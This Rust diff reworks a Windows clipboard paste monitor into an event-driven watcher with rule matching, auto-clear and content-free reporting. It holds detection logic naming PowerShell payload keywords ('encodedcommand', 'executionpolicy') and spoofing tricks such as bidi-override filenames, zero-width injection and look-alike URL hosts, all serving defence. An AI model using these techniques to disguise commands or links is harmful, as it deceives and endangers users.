+// carries the migrated free-tier builtins + the two structured checks),
+// so it stays exactly as it was, running before the category-pattern
+// check on every clipboard change (see the main loop below).
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 enum CryptoFamily {
@@ -586,6 +704,15 @@ fn decide_crypto_swap(
 
 static RUNNING: AtomicBool = AtomicBool::new(false);
 
+/// Bumped on every `start_paste_monitor` call. Lets a background task from
+/// a PREVIOUS start reliably notice it has been superseded even if
+/// `RUNNING` gets flipped back to `true` by a fresh start before the old
+/// task's blocking `wait_for_change()` call returns — see
+/// `start_paste_monitor`'s doc for why the event-driven listener makes
+/// this race more likely to matter than it was under the old fixed-
+/// interval poll.
+static GENERATION: AtomicU64 = AtomicU64::new(0);
+
 static ENABLED_CATEGORIES: Lazy<Mutex<EnabledCategories>> =
     Lazy::new(|| Mutex::new(EnabledCategories::default()));
 
@@ -608,6 +735,38 @@ const CRYPTO_SWAP_WINDOW: Duration = Duration::from_secs(60);
 /// detection with low FP cost (only fires on a change-of-address).
 static CRYPTO_SWAP_ENABLED: AtomicBool = AtomicBool::new(true);
 
+/// The free-tier `wincmd_clip_rules` policy currently installed — see
+/// `install_free_tier_policy`. Starts empty (matches nothing) until the
+/// watcher's first `start_paste_monitor` call.
+static POLICY: Lazy<Mutex<PolicyStore>> = Lazy::new(|| Mutex::new(PolicyStore::new()));
+
+/// `RuleId → MatchedKind` for the CURRENTLY installed policy — lets a
+/// `Verdict` (which is structurally content-free and carries no name) be
+/// turned back into a display name/severity for the toast/report.
+static RULE_LOOKUP: Lazy<Mutex<HashMap<RuleId, MatchedKind>>> =
+    Lazy::new(|| Mutex::new(HashMap::new()));
+
+/// Aggregate honest-health booleans (plan §4.2 Phase 1: "report that
+/// honestly via capability status"). See this file's module doc and its
+/// handoff note for the exact keys a later `capability_status` integration
+/// should read.
+static HEALTH: Lazy<Mutex<HelperHealth>> = Lazy::new(|| Mutex::new(HelperHealth::default()));
+
+/// The stop flag handed to `listener::start` for the CURRENTLY running
+/// watcher instance, if any. `stop_paste_monitor` flips it so the polling
+/// fallback (`SequencePoller`) notices within one fallback tick; see
+/// `stop_paste_monitor`'s doc for the event-driven listener's own,
+/// different (and documented) stop-latency behaviour.
+static LISTENER_STOP: Lazy<Mutex<Option<Arc<AtomicBool>>>> = Lazy::new(|| Mutex::new(None));
+
+/// SHA-256 of the last clipboard text this file actually processed.
+/// Shared (rather than a local variable) because BOTH the clipboard-
+/// change-driven task and the housekeeping task's own clipboard writes
+/// (auto-clear on detection, auto-clear on lock) need to update it, exactly
+/// mirroring the old single-loop design where both concerns shared one
+/// local `last_hash`.
+static LAST_HASH: Lazy<Mutex<Option<[u8; 32]>>> = Lazy::new(|| Mutex::new(None));
+
 // ── Auto-clear sensitive content (paid extension) ───────────────────
 //
 // After a detection fires, schedule the clipboard to be erased N seconds
@@ -626,8 +785,9 @@ static AUTO_CLEAR_SECONDS: AtomicU32 = AtomicU32::new(30);
 static AUTO_CLEAR_ON_LOCK: AtomicBool = AtomicBool::new(false);
 
 /// `Some((deadline, hash_at_detection))` while an auto-clear is pending.
-/// On each poll tick the watcher checks this — if deadline reached AND
-/// current clipboard hash still matches, it clears the clipboard.
+/// The housekeeping task checks this every tick — if the deadline has
+/// passed AND the current clipboard hash still matches, it clears the
+/// clipboard.
 #[allow(clippy::type_complexity)]
 static PENDING_CLEAR: Lazy<Mutex<Option<(Instant, [u8; 32])>>> = Lazy::new(|| Mutex::new(None));
 
@@ -636,6 +796,19 @@ fn clear_clipboard() -> bool {
     // "clear" — `clipboard_win::empty()` works too but some apps poll
     // the clipboard expecting SOME format to be present.
     clipboard_win::set_clipboard_string("").is_ok()
+}
+
+/// Pure health-bookkeeping decision for one clear attempt: never claim a
+/// failed erase succeeded (plan §9 exit criterion: "clear/quarantine
+/// outcome is verified and reported as success/failure only"). This backs
+/// BOTH of this file's own clipboard-erasing call sites (auto-clear on
+/// detection, auto-clear on workstation lock) — neither is a
+/// `wincmd_clip_rules::Action::ClearClipboard` requested BY a matched rule
+/// (this file's own free-tier rules never request that action; see the
+/// module doc), but the same "never lie about a failed clear" invariant
+/// applies regardless of which mechanism triggered the attempt.
+fn clear_health_after_attempt(cleared_ok: bool) -> bool {
+    !cleared_ok
 }
 
 // ── Workstation-lock probe ──────────────────────────────────────────
@@ -731,152 +904,21 @@ pub struct DetectionEvent {
     pub detected_at: String,
 }
 
-// ── Helpers ─────────────────────────────────────────────────────────
+/// Content-free reports queued for the check-in path (plan §4.2 item 5).
+/// Bounded so a long-running session can't grow this unboundedly; a
+/// future check-in integrator (`commander-pro` — a later workflow) should
+/// use `drain_paste_monitor_pending_reports` to actually flush these
+/// toward `CheckinBody.clipboard_events`.
+const PENDING_REPORTS_CAP: usize = 20;
+static PENDING_REPORTS: Lazy<Mutex<VecDeque<ClipboardEventReport>>> =
+    Lazy::new(|| Mutex::new(VecDeque::with_capacity(PENDING_REPORTS_CAP)));
 
-fn poll_clipboard_text() -> Option<String> {
-    use clipboard_win::{formats, get_clipboard};
-    // Single-attempt read. Previous retry loop slept up to 150ms total
-    // via std::thread::sleep on a tokio worker — that blocks the runtime
-    // and the next tick re-reads anyway. Transient clipboard-locked
-    // failures are tolerable; we'll catch the content on the next poll.
-    get_clipboard::<String, _>(formats::Unicode).ok()
-}
+// ── Helpers ─────────────────────────────────────────────────────────
 
 fn hash_text(s: &str) -> [u8; 32] {
     let mut h = Sha256::new();
     h.update(s.as_bytes());
     h.finalize().into()
-}
-
-fn check_patterns(text: &str, enabled: &EnabledCategories) -> Option<(&'static str, Category)> {
-    if text.len() < 13 {
-        return None;
-    }
-    for p in PATTERNS.iter() {
-        if !enabled.allows(p.category) {
-            continue;
-        }
-        if p.re.is_match(text) {
-            return Some((p.name, p.category));
-        }
-    }
-    if enabled.personal_data && looks_like_credit_card(text) {
-        return Some(("Credit Card Number", Category::PersonalData));
-    }
-    if enabled.unicode {
-        if let Some(name) = check_unicode_anomaly(text) {
-            return Some((name, Category::UnicodeAnomaly));
-        }
-    }
-    None
-}
-
-// ── Unicode-anomaly matchers ────────────────────────────────────────
-//
-// Three sub-matchers, ordered by signal strength:
-//
-//   1. Bidi override (U+202D / U+202E) outside an RTL-script context.
-//      Almost-always hostile — `filename.txt<RLO>gpj.exe` style spoofing,
-//      where the embedded U+202E reverses the display so the file looks
-//      like `filename.txt.exe.jpg` to the operator. We DON'T inline the
-//      real codepoint in source here because rustc refuses to compile
-//      comments containing bidi-control chars (rightly).
-//   2. Zero-width chars (U+200B/200C/200D/U+FEFF) inside what looks like
-//      code/identifier text. Used for invisible payload injection.
-//   3. Mixed-script URL host — Cyrillic / Greek codepoints in an
-//      otherwise-Latin host (`pаypal.com` with Cyrillic 'а').
-//
-// Order matters: bidi-override doesn't depend on length or context, so
-// it's cheapest and fires first. Mixed-script needs a URL parse, so
-// it's last.
-
-const ZERO_WIDTH: &[char] = &[
-    '\u{200B}', // ZWSP
-    '\u{200C}', // ZWNJ
-    '\u{200D}', // ZWJ
-    '\u{FEFF}', // BOM / ZWNBSP
-];
-
-const BIDI_OVERRIDE: &[char] = &['\u{202D}', '\u{202E}'];
-
-/// `true` if `c` is in a script block that confuses with basic Latin.
-/// Cyrillic basic (U+0400..U+04FF) and Greek basic (U+0370..U+03FF) are
-/// the load-bearing cases for phishing URLs.
-fn is_confusable_with_latin(c: char) -> bool {
-    let n = c as u32;
-    (0x0400..=0x04FF).contains(&n) || (0x0370..=0x03FF).contains(&n)
-}
-
-/// `true` if `c` is a member of an actual RTL script (Arabic/Hebrew).
-/// Used to suppress bidi-override false-positives in genuine RTL text.
-fn is_rtl_script(c: char) -> bool {
-    let n = c as u32;
-    (0x0590..=0x05FF).contains(&n) // Hebrew
-        || (0x0600..=0x06FF).contains(&n) // Arabic
-        || (0x0750..=0x077F).contains(&n) // Arabic Supplement
-        || (0xFB50..=0xFDFF).contains(&n) // Arabic Presentation A
-        || (0xFE70..=0xFEFF).contains(&n) // Arabic Presentation B
-}
-
-/// Find the FIRST URL host in the text. Returns `None` if no URL.
-/// Bare-bones — no need for the `url` crate; we just want chars between
-/// the scheme `://` and the next `/`, `?`, `#`, or whitespace.
-fn first_url_host(text: &str) -> Option<&str> {
-    let lower = text.as_bytes();
-    let needle_a = b"http://";
-    let needle_b = b"https://";
-    let pos = (0..lower.len())
-        .find(|&i| lower[i..].starts_with(needle_a) || lower[i..].starts_with(needle_b))?;
-    let after_scheme = if lower[pos..].starts_with(needle_b) {
-        pos + needle_b.len()
-    } else {
-        pos + needle_a.len()
-    };
-    let rest = &text[after_scheme..];
-    let end = rest
-        .find(|c: char| c == '/' || c == '?' || c == '#' || c.is_whitespace())
-        .unwrap_or(rest.len());
-    Some(&rest[..end])
-}
-
-/// Returns the matched-pattern name (stable string for the event) if a
-/// unicode anomaly is detected; `None` otherwise.
-fn check_unicode_anomaly(text: &str) -> Option<&'static str> {
-    // 1) Bidi override outside RTL context.
-    let has_bidi = text.chars().any(|c| BIDI_OVERRIDE.contains(&c));
-    if has_bidi {
-        let has_rtl_text = text.chars().any(is_rtl_script);
-        if !has_rtl_text {
-            return Some("Bidi Override (U+202D/E)");
-        }
-    }
-
-    // 2) Zero-width chars in code-like context. "Code-like" = the
-    //    char IMMEDIATELY before or after is ASCII alphanumeric. This
-    //    suppresses legitimate ZWJ usage in emoji sequences (the ZWJ
-    //    sits between two emoji codepoints, not letters/digits).
-    let chars: Vec<char> = text.chars().collect();
-    for (i, &c) in chars.iter().enumerate() {
-        if !ZERO_WIDTH.contains(&c) {
-            continue;
-        }
-        let prev_ok = i > 0 && chars[i - 1].is_ascii_alphanumeric();
-        let next_ok = i + 1 < chars.len() && chars[i + 1].is_ascii_alphanumeric();
-        if prev_ok || next_ok {
-            return Some("Zero-Width Chars in Code");
-        }
-    }
-
-    // 3) Mixed-script URL host.
-    if let Some(host) = first_url_host(text) {
-        let has_latin = host.chars().any(|c| c.is_ascii_alphabetic());
-        let has_confusable = host.chars().any(is_confusable_with_latin);
-        if has_latin && has_confusable {
-            return Some("Confusable URL Host (mixed scripts)");
-        }
-    }
-
-    None
 }
 
 /// Returns true if currently snoozed; clears expired snooze in passing.
@@ -903,6 +945,133 @@ fn push_recent(ev: DetectionEvent) {
     q.push_back(ev);
 }
 
+fn push_pending_report(report: ClipboardEventReport) {
+    let mut q = PENDING_REPORTS.lock().unwrap();
+    if q.len() == PENDING_REPORTS_CAP {
+        q.pop_front();
+    }
+    q.push_back(report);
+}
+
+/// Build the content-free wire report for one emitted match — pulled out
+/// of `handle_emit` so the content-free guarantee is directly testable
+/// without an `AppHandle`/native notification (see the sentinel test
+/// below). Mirrors `clipboard_guard_helper::report::build_report`'s own
+/// doc: called with an `ActionOutcome` reflecting only the LOCAL action
+/// (`NotifyUser`) actually attempted so far — `ReportFleet` is never
+/// marked as attempted in the report that IS the attempt (a message can't
+/// truthfully assert its own successful delivery before delivery
+/// happens).
+fn build_pending_report(
+    policy_version: i64,
+    verdict: &Verdict,
+    notified_ok: bool,
+    suppressed_since_last: u32,
+) -> ClipboardEventReport {
+    let outcome = ActionOutcome {
+        attempted: vec![Action::NotifyUser],
+        succeeded: if notified_ok {
+            vec![Action::NotifyUser]
+        } else {
+            Vec::new()
+        },
+    };
+    build_report(
+        policy_version,
+        &verdict.rule_id,
+        verdict.rule_revision,
+        verdict.severity,
+        &outcome,
+        suppressed_since_last,
+    )
+}
+
+/// Handle one `MatchOutcome::Emit` — the toast/`DetectionEvent`/log
+/// exactly matches the legacy engine's copy and behaviour (see
+/// `detection_copy`); the report-building/queuing and best-effort svc
+/// submission are new (plan §4.2 items 5/6).
+///
+/// **Honest caveat on the svc submission**: `svc.clipboard.report_event`
+/// is a `SessionHelper`-class verb (GROUNDING §7, D-2). As of this file's
+/// writing, `commander-svc/src/pipe.rs` does not yet unwrap `Envelope::
+/// Signed` request frames and its `SessionHelper` authorization gate is
+/// still fail-closed pending the D-2 peer-pinning wiring (see
+/// `clipboard-guard-helper`'s own handoff note, which documents the exact
+/// same gap for its standalone client) — this file did not, and by file
+/// ownership could not, fix that in `pipe.rs`. The call below degrades
+/// gracefully either way (`SvcClient` never panics or hangs — see its own
+/// module doc) and `HEALTH.svc_reachable` reports the true outcome; the
+/// queued `PENDING_REPORTS` ring is this file's OWN durable-enough record
+/// of what was detected regardless of whether the live call succeeds.
+fn handle_emit(
+    app: &AppHandle,
+    policy_version: i64,
+    verdict: Verdict,
+    suppressed_since_last: u32,
+    clipboard_hash: [u8; 32],
+) {
+    let kind = RULE_LOOKUP.lock().unwrap().get(&verdict.rule_id).copied();
+    let Some(kind) = kind else {
+        // Defensive only — `verdict.rule_id` can only be one of this
+        // file's own fixed `FREE_TIER_PATTERNS` ids (see
+        // `install_free_tier_policy`). Never panics on a fallible runtime
+        // path; just skip this match.
+        crate::log_message(
+            "warn",
+            "[PasteMonitor] matched a rule id this file doesn't recognise — skipping",
+        );
+        return;
+    };
+
+    let pattern = kind.display_name();
+    let severity = severity_label(verdict.severity);
+
+    let payload = DetectionEvent {
+        pattern: pattern.to_string(),
+        severity: severity.to_string(),
+        detected_at: chrono::Utc::now().to_rfc3339(),
+    };
+    let _ = app.emit("paste-monitor-detected", &payload);
+
+    // Schedule auto-clear if enabled — same trigger/timing as before.
+    if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
+        let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
+        *PENDING_CLEAR.lock().unwrap() = Some(schedule_clear(Instant::now(), secs, clipboard_hash));
+    }
+
+    let (title, body) = detection_copy(pattern, severity);
+    let notified_ok = match crate::native_notify::show_native_notification(app, title, &body) {
+        Ok(()) => true,
+        Err(e) => {
+            crate::log_message(
+                "warn",
+                &format!("[PasteMonitor] notification failed: {}", e),
+            );
+            false
+        }
+    };
+
+    push_recent(payload);
+    crate::log_message(
+        "info",
+        &format!("[PasteMonitor] detected ({}): {}", severity, pattern),
+    );
+
+    let report = build_pending_report(policy_version, &verdict, notified_ok, suppressed_since_last);
+    push_pending_report(report.clone());
+
+    // Best-effort, fire-and-forget delivery toward commander-svc. Never
+    // blocks this loop, never retransmits an amended report (see
+    // `report::build_report`'s own doc for why), and never panics —
+    // `SvcClient` already retries with backoff internally and degrades any
+    // failure to a typed `SvcError` (see this function's doc above for the
+    // known, documented gap on the svc side).
+    tauri::async_runtime::spawn(async move {
+        let ok = SvcClient::new().report_event(&report).await.is_ok();
+        HEALTH.lock().unwrap().svc_reachable = ok;
+    });
+}
+
 // ── Tauri command surface ───────────────────────────────────────────
 
 #[tauri::command]
@@ -910,207 +1079,284 @@ pub async fn start_paste_monitor(app: AppHandle) -> Result<(), String> {
     if RUNNING.swap(true, Ordering::SeqCst) {
         return Ok(()); // already running, idempotent
     }
+    let generation = GENERATION.fetch_add(1, Ordering::SeqCst) + 1;
     crate::log_message("debug", "[PasteMonitor] watcher started");
 
-    tauri::async_runtime::spawn(async move {
-        let mut last_hash: Option<[u8; 32]> = None;
-        // 2s poll matches typical paste-attack reaction window without
-        // burning a tokio worker every 750ms on a hot loop that
-        // regex-scans + SHA-256s the clipboard every tick.
-        let mut interval = tokio::time::interval(Duration::from_millis(2000));
-        interval.tick().await; // discard first immediate tick
-        let mut was_locked = false;
+    {
+        let enabled = *ENABLED_CATEGORIES.lock().unwrap();
+        install_free_tier_policy(&enabled);
+    }
 
-        while RUNNING.load(Ordering::SeqCst) {
-            interval.tick().await;
+    let mut health = *HEALTH.lock().unwrap();
+    health.helper_running = true;
 
-            // Auto-clear on lock: fires only on the unlocked→locked
-            // transition so a station that was already locked at startup
-            // does not trigger a spurious clear.
-            if let Some(locked) = workstation_is_locked() {
-                if locked
-                    && !was_locked
-                    && AUTO_CLEAR_ON_LOCK.load(Ordering::SeqCst)
-                    && clear_clipboard()
+    // Event-driven listener, falling back to a slow sequence-number poll
+    // if `AddClipboardFormatListener` registration fails — never silently
+    // (plan §4.2): `listener::start` writes `health.listener_registered`
+    // honestly either way.
+    let stop = Arc::new(AtomicBool::new(false));
+    let (change_source, mode) =
+        listener::start(Duration::from_millis(2000), stop.clone(), &mut health);
+    crate::log_message("info", &format!("[PasteMonitor] listener mode: {:?}", mode));
+
+    *HEALTH.lock().unwrap() = health;
+    *LISTENER_STOP.lock().unwrap() = Some(stop);
+
+    // ── Task A: housekeeping — auto-clear-on-lock + pending-clear
+    //    deadline, independent of clipboard-change events (a lock or a
+    //    deadline can happen with no new clipboard content at all). Ticks
+    //    every 2s, matching the legacy combined loop's cadence.
+    {
+        let my_generation = generation;
+        tauri::async_runtime::spawn(async move {
+            let mut interval = tokio::time::interval(Duration::from_millis(2000));
+            interval.tick().await; // discard first immediate tick
+            let mut was_locked = false;
+            let mut lock_text_source = Win32TextSource::default();
+
+            loop {
+                interval.tick().await;
+                if GENERATION.load(Ordering::SeqCst) != my_generation
+                    || !RUNNING.load(Ordering::SeqCst)
                 {
-                    crate::log_message(
-                        "info",
-                        "[PasteMonitor] auto-clear on lock — clipboard erased",
-                    );
-                    last_hash = Some(hash_text(""));
+                    break;
                 }
-                was_locked = locked;
-            }
 
-            // Auto-clear: if a clear is pending and its deadline has passed,
-            // erase the clipboard but only if its content hasn't changed since
-            // the detection (user didn't deliberately copy something else).
-            // Runs even while snoozed — snooze suppresses DETECTION, not the
-            // protective erase of an already-detected payload.
-            {
+                // Auto-clear on lock: fires only on the unlocked→locked
+                // transition so a station that was already locked at
+                // startup does not trigger a spurious clear.
+                if let Some(locked) = workstation_is_locked() {
+                    if locked && !was_locked && AUTO_CLEAR_ON_LOCK.load(Ordering::SeqCst) {
+                        let cleared = clear_clipboard();
+                        HEALTH.lock().unwrap().clear_failing = clear_health_after_attempt(cleared);
+                        if cleared {
+                            crate::log_message(
+                                "info",
+                                "[PasteMonitor] auto-clear on lock — clipboard erased",
+                            );
+                            *LAST_HASH.lock().unwrap() = Some(hash_text(""));
+                        }
+                    }
+                    was_locked = locked;
+                }
+
+                // Pending auto-clear: erase only if the deadline has
+                // passed AND the content hasn't changed since detection.
+                // Runs even while snoozed — snooze suppresses DETECTION,
+                // not the protective erase of an already-detected payload.
                 let pending = *PENDING_CLEAR.lock().unwrap();
                 if let Some(pending) = pending {
                     if Instant::now() >= pending.0 {
-                        let current_hash = poll_clipboard_text().map(|t| hash_text(&t));
-                        if should_auto_clear(pending, Instant::now(), current_hash)
-                            && clear_clipboard()
-                        {
-                            crate::log_message(
-                                "info",
-                                "[PasteMonitor] auto-clear fired — clipboard erased",
-                            );
-                            last_hash = Some(hash_text(""));
+                        let current_hash = match lock_text_source.read_text() {
+                            ReadOutcome::Text(t) => Some(hash_text(&t)),
+                            ReadOutcome::NoText | ReadOutcome::Failed => None,
+                        };
+                        if should_auto_clear(pending, Instant::now(), current_hash) {
+                            let cleared = clear_clipboard();
+                            HEALTH.lock().unwrap().clear_failing =
+                                clear_health_after_attempt(cleared);
+                            if cleared {
+                                crate::log_message(
+                                    "info",
+                                    "[PasteMonitor] auto-clear fired — clipboard erased",
+                                );
+                                *LAST_HASH.lock().unwrap() = Some(hash_text(""));
+                            }
                         }
                         *PENDING_CLEAR.lock().unwrap() = None;
                     }
                 }
             }
+        });
+    }
 
-            if is_snoozed() {
-                continue;
-            }
+    // ── Task B: clipboard-change-driven detection.
+    {
+        let app = app.clone();
+        let my_generation = generation;
+        tauri::async_runtime::spawn(async move {
+            let mut change_source = change_source;
+            let mut text_source = Win32TextSource::default();
+            let mut engine = MatchEngine::new();
 
-            let text = match poll_clipboard_text() {
-                Some(t) => t,
-                None => continue,
-            };
-            let h = hash_text(&text);
-            if last_hash == Some(h) {
-                continue;
-            }
-            last_hash = Some(h);
+            loop {
+                if GENERATION.load(Ordering::SeqCst) != my_generation
+                    || !RUNNING.load(Ordering::SeqCst)
+                {
+                    break;
+                }
 
-            let enabled = *ENABLED_CATEGORIES.lock().unwrap();
-
-            // ── Crypto-swap detection (runs BEFORE category patterns so
-            //    clipboard-hijack signatures aren't masked by an unrelated
-            //    secret accidentally landing on the clipboard).
-            let swap_hit: Option<CryptoFamily> = if CRYPTO_SWAP_ENABLED.load(Ordering::SeqCst) {
-                let current = extract_crypto_addresses(&text);
-                let mut last_map = LAST_CRYPTO_ADDR.lock().unwrap();
-                decide_crypto_swap(&current, &mut last_map, Instant::now())
-            } else {
-                None
-            };
-
-            if let Some(family) = swap_hit {
-                let pattern = format!("Crypto Address Swap ({})", family.display());
-                let payload = DetectionEvent {
-                    pattern: pattern.clone(),
-                    severity: "danger".to_string(),
-                    detected_at: chrono::Utc::now().to_rfc3339(),
+                // `wait_for_change` blocks (possibly indefinitely, for the
+                // real event-driven listener) — run it on a blocking-pool
+                // thread rather than the async worker, per `listener::
+                // ClipboardChangeSource`'s own contract. `change_source`
+                // is moved in and back out because it (and the real
+                // `Win32EventListener` it may wrap) isn't `Sync`-shareable
+                // across an `.await` any other way.
+                let joined = tokio::task::spawn_blocking(move || {
+                    let changed = change_source.wait_for_change();
+                    (change_source, changed)
+                })
+                .await;
+                let (returned_source, changed) = match joined {
+                    Ok(v) => v,
+                    Err(_) => break, // blocking task panicked — stop, don't spin
                 };
-                let _ = app.emit("paste-monitor-detected", &payload);
-                let body = format!(
-                    "Your clipboard's {} address just changed to a different one without you copying it. \
-                        Clipboard-hijack malware is the most likely cause. DO NOT send — verify the address character-by-character.",
-                    family.display()
-                );
-                if let Err(e) = crate::native_notify::show_native_notification(
-                    &app,
-                    "WinCommander - Crypto address swap",
-                    &body,
-                ) {
-                    crate::log_message(
-                        "warn",
-                        &format!("[PasteMonitor] notification failed: {}", e),
-                    );
+                change_source = returned_source;
+                if !changed {
+                    // The change source itself was asked to stop.
+                    break;
                 }
-                push_recent(payload);
-                crate::log_message(
-                    "info",
-                    &format!("[PasteMonitor] crypto-swap detected: {}", family.display()),
-                );
-
-                // Schedule auto-clear if enabled — crypto-swap warrants
-                // aggressive clearing because the attacker's address
-                // sitting on the clipboard is the active threat.
-                if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
-                    let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
-                    *PENDING_CLEAR.lock().unwrap() = Some(schedule_clear(Instant::now(), secs, h));
+                if GENERATION.load(Ordering::SeqCst) != my_generation
+                    || !RUNNING.load(Ordering::SeqCst)
+                {
+                    break;
                 }
 
-                // Don't ALSO run pattern check — the swap is the primary signal.
-                continue;
-            }
+                if is_snoozed() {
+                    continue;
+                }
 
-            if let Some((pattern, category)) = check_patterns(&text, &enabled) {
-                let severity = category.severity();
-                let payload = DetectionEvent {
-                    pattern: pattern.to_string(),
-                    severity: severity.to_string(),
-                    detected_at: chrono::Utc::now().to_rfc3339(),
+                let text = match text_source.read_text() {
+                    ReadOutcome::Text(t) => t,
+                    ReadOutcome::NoText => continue,
+                    ReadOutcome::Failed => {
+                        crate::log_message(
+                            "warn",
+                            "[PasteMonitor] clipboard read failed after retries",
+                        );
+                        continue;
+                    }
                 };
-                let _ = app.emit("paste-monitor-detected", &payload);
 
-                // Schedule auto-clear if enabled.
-                if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
-                    let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
-                    *PENDING_CLEAR.lock().unwrap() = Some(schedule_clear(Instant::now(), secs, h));
+                let h = hash_text(&text);
+                let is_dup = {
+                    let mut last = LAST_HASH.lock().unwrap();
+                    if *last == Some(h) {
+                        true
+                    } else {
+                        *last = Some(h);
+                        false
+                    }
+                };
+                if is_dup {
+                    continue;
                 }
 
-                // Different toast copy for danger severity. Credential
-                // leaks: "be careful where you paste". Malicious commands:
-                // "do NOT paste this anywhere — it's likely malware."
-                // The danger phrasing has to be unambiguous because the
-                // user is being actively socially-engineered at this
-                // exact moment ("just press Win+R and paste this to
-                // verify you're human").
-                let is_powershell = pattern.to_ascii_lowercase().contains("powershell")
-                    || pattern.to_ascii_lowercase().contains("encodedcommand")
-                    || pattern.to_ascii_lowercase().contains("executionpolicy")
-                    || pattern.to_ascii_lowercase().contains("pwsh");
-                let (title, body) = if severity == "danger" && is_powershell {
-                    (
-                        "WinCommander · Dangerous PowerShell command",
-                        format!(
-                            "Clipboard contains a PowerShell-style payload ({}). \
-                            Do not paste it into Win+R, Terminal, or PowerShell unless you wrote it yourself.",
-                            pattern
-                        ),
-                    )
-                } else if severity == "danger" {
-                    (
-                        "WinCommander · Suspicious clipboard content",
-                        format!(
-                            "You copied something that looks like a malware payload ({}). \
-                            Do not paste this into Win+R, PowerShell, or any terminal. \
-                            This is the ClickFix / pastejacking trick.",
-                            pattern
-                        ),
-                    )
+                // ── Crypto-swap detection (unchanged; runs BEFORE
+                //    category pattern matching so a hijack signature isn't
+                //    masked by an unrelated secret landing on the
+                //    clipboard at the same time).
+                let swap_hit: Option<CryptoFamily> = if CRYPTO_SWAP_ENABLED.load(Ordering::SeqCst) {
+                    let current = extract_crypto_addresses(&text);
+                    let mut last_map = LAST_CRYPTO_ADDR.lock().unwrap();
+                    decide_crypto_swap(&current, &mut last_map, Instant::now())
                 } else {
-                    (
-                        "WinCommander · Paste Monitor",
-                        format!(
-                            "Looks like you copied a {} — be careful where you paste it.",
-                            pattern
-                        ),
-                    )
+                    None
                 };
-                if let Err(e) = crate::native_notify::show_native_notification(&app, title, &body) {
-                    crate::log_message(
-                        "warn",
-                        &format!("[PasteMonitor] notification failed: {}", e),
+
+                if let Some(family) = swap_hit {
+                    let pattern = format!("Crypto Address Swap ({})", family.display());
+                    let payload = DetectionEvent {
+                        pattern: pattern.clone(),
+                        severity: "danger".to_string(),
+                        detected_at: chrono::Utc::now().to_rfc3339(),
+                    };
+                    let _ = app.emit("paste-monitor-detected", &payload);
+                    let body = format!(
+                        "Your clipboard's {} address just changed to a different one without you copying it. \
+                            Clipboard-hijack malware is the most likely cause. DO NOT send — verify the address character-by-character.",
+                        family.display()
                     );
+                    if let Err(e) = crate::native_notify::show_native_notification(
+                        &app,
+                        "WinCommander - Crypto address swap",
+                        &body,
+                    ) {
+                        crate::log_message(
+                            "warn",
+                            &format!("[PasteMonitor] notification failed: {}", e),
+                        );
+                    }
+                    push_recent(payload);
+                    crate::log_message(
+                        "info",
+                        &format!("[PasteMonitor] crypto-swap detected: {}", family.display()),
+                    );
+
+                    if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
+                        let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
+                        *PENDING_CLEAR.lock().unwrap() =
+                            Some(schedule_clear(Instant::now(), secs, h));
+                    }
+
+                    // Don't ALSO run category matching — the swap is the
+                    // primary signal.
+                    continue;
                 }
 
-                push_recent(payload);
-                crate::log_message(
-                    "info",
-                    &format!("[PasteMonitor] detected ({}): {}", severity, pattern),
-                );
+                // ── Builtin/structured category matching via
+                //    wincmd_clip_rules, gated by the same `< 13 bytes`
+                //    floor the legacy engine used (kept for byte-for-byte
+                //    parity, including its one quirk: a match under 13
+                //    bytes never fires, even a unicode-anomaly one).
+                if text.len() >= 13 {
+                    let (outcome, policy_version) = {
+                        let policy = POLICY.lock().unwrap();
+                        let policy_version = policy.active().policy_version;
+                        (
+                            engine.observe(policy.active(), &text, Instant::now()),
+                            policy_version,
+                        )
+                    };
+                    match outcome {
+                        MatchOutcome::NoMatch => {}
+                        MatchOutcome::Suppressed { .. } => {
+                            // Folded into the next Emit's
+                            // `suppressed_since_last` — no toast, no
+                            // report, per plan §4.2/§4.4: a repeated match
+                            // becomes a count, not an alert storm.
+                        }
+                        MatchOutcome::Emit {
+                            verdict,
+                            suppressed_since_last,
+                        } => {
+                            handle_emit(&app, policy_version, verdict, suppressed_since_last, h);
+                        }
+                    }
+                }
             }
-        }
-        crate::log_message("debug", "[PasteMonitor] watcher stopped");
-    });
+
+            HEALTH.lock().unwrap().helper_running = false;
+            crate::log_message("debug", "[PasteMonitor] watcher stopped");
+        });
+    }
 
     Ok(())
 }
 
+/// Stop the watcher. This is a SOFT stop, same as the legacy engine's own
+/// (which took up to one 2s poll tick to notice): the polling fallback
+/// (`SequencePoller`) notices within one fallback tick because its `stop`
+/// flag is checked inside its own sleep loop. The real event-driven
+/// listener has no such internal check — `Win32EventListener::
+/// wait_for_change` just blocks on a channel recv — so when it's actually
+/// registered, teardown only happens the NEXT time a real clipboard change
+/// wakes the blocking call (which then sees `RUNNING == false` and drops
+/// the listener, running its `Drop` — `RemoveClipboardFormatListener` +
+/// thread join). In practice this is rarely noticeable (interactive
+/// desktops see clipboard activity often), and `RUNNING`/`GENERATION`
+/// checks mean a not-yet-torn-down instance does nothing observable in the
+/// meantime; this is a documented, accepted limitation of reusing
+/// `clipboard_guard_helper::listener`'s blocking `ClipboardChangeSource`
+/// API (see that crate's own `bin/main.rs`, which has the identical gap
+/// and says so).
 #[tauri::command]
 pub async fn stop_paste_monitor() -> Result<(), String> {
     RUNNING.store(false, Ordering::SeqCst);
+    if let Some(stop) = LISTENER_STOP.lock().unwrap().take() {
+        stop.store(true, Ordering::SeqCst);
+    }
     Ok(())
 }
 
@@ -1122,10 +1368,13 @@ pub async fn paste_monitor_status() -> Result<bool, String> {
 /// Update which pattern categories the watcher fires for. Frontend calls
 /// this on app boot (after settings load) and on every category toggle.
 /// Settings.json is the persistent layer; this mutex is the runtime
-/// authority that the watcher reads from.
+/// authority that the watcher reads from. Recompiles the free-tier
+/// `wincmd_clip_rules` ruleset immediately (see `install_free_tier_policy`)
+/// so a toggle takes effect on the very next clipboard change.
 #[tauri::command]
 pub async fn set_paste_monitor_categories(categories: EnabledCategories) -> Result<(), String> {
     *ENABLED_CATEGORIES.lock().unwrap() = categories;
+    install_free_tier_policy(&categories);
     Ok(())
 }
 
